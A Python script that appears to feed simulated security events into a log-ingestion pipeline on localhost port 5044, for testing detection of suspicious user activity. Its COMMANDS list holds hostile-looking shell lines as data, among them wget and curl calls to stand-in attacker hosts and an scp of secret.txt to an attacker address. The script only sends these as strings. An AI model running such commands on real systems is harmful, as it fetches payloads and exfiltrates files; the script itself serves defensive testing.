import socket
import json
import time
import uuid
import random
from datetime import datetime

# Suspicious / risky commands to simulate
COMMANDS = [
    "wget http://malicious.site/payload",
    "curl http://attacker.com/steal",
    "scp secret.txt attacker@10.0.0.9:/tmp/",
    "chmod 777 confidential.db",
    "tar -cf data.tar /home/alice/docs/"
]

USERS = ["alice", "bob", "carol", "dave", "eve"]


def send_suspicious_commands(host="localhost", port=5044):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    user = random.choice(USERS)
    print(f"[*] Simulating suspicious commands for user: {user}")

    try:
        for cmd in COMMANDS:
            event = {
                "event_id": str(uuid.uuid4()),
                "timestamp": datetime.utcnow().isoformat(),
                "user": user,
                "action": "cmd",
                "file": None,
                "cmd": cmd,
                "bytes": None,
                "source_ip": f"10.0.0.{random.randint(2, 254)}"
            }
            line = json.dumps(event) + "\n"
            s.sendall(line.encode())
            print("Sent suspicious cmd:", cmd)
            time.sleep(1.0)
    finally:
        s.close()
        print("[*] Suspicious command attack simulation complete.")


if __name__ == "__main__":
    send_suspicious_commands()
